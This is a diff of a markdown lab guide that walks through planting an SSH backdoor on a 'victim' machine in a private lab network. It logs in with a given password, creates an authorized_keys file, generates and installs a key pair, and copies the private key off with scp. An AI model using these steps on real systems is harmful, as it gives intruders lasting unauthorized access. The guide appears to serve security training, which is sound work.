@@ -17,24 +17,46 @@ Host IP: **192.168.1.132**
 <br/>
 
 ## Instructions
+The lab scenario starts on the attacker machine and all offensive techniques will be carried out from this machine.
 
-1.1 Create .SSH directory
+1. Log into the victim machine with SSH using the command below. When prompted for password use: **l3tmein**
 ```sh
-# Create .SSH directory
+ssh web@192.168.212.151
+```
+
+2. Now that you managed access the victim machine it's time to set up the ssh backdoor via authorized keys. In the users home directory create the *.ssh* directory using the following command. Note that the . (dot) in front of the directory name means that this is a hidden directory.
+```sh
 mkdir .ssh
+```
 
-# Create the authorized keys file
+3. Next create a file called *authorized_keys* without any extensionu sing the touch command. This file is used to store the public SSH keys coresponding to the users who can access this server using their respective private keys.
+```sh
 touch .ssh/authorized_keys
+```
 
-# Ensure proper permissions
+4. One important aspect that should not be ignored is the restrictive permissions that must be seet for the *.ssh* and *authorized_keys*. This can be done with the <code>chmod</code> command.
+```sh
 chmod 700 .ssh
 chmod 600 .ssh/authorized_keys
+```
 
-# Generare ssh key pairs
+5. 
+
+```sh
+# Generare ssh key pair
 ssh-keygen -b 4096 -t rsa
+```
 
+6. 
+```sh
 # Copy the public key in the authorized keys file
 cat .ssh/id_rsa.pub >> .ssh/authorized_keys
+```
+
+
+```sh
+
+
 
 # retrieve the private key from the server using SCP to the local folder
 scp web@192.168.212.151:.ssh/id_rsa .
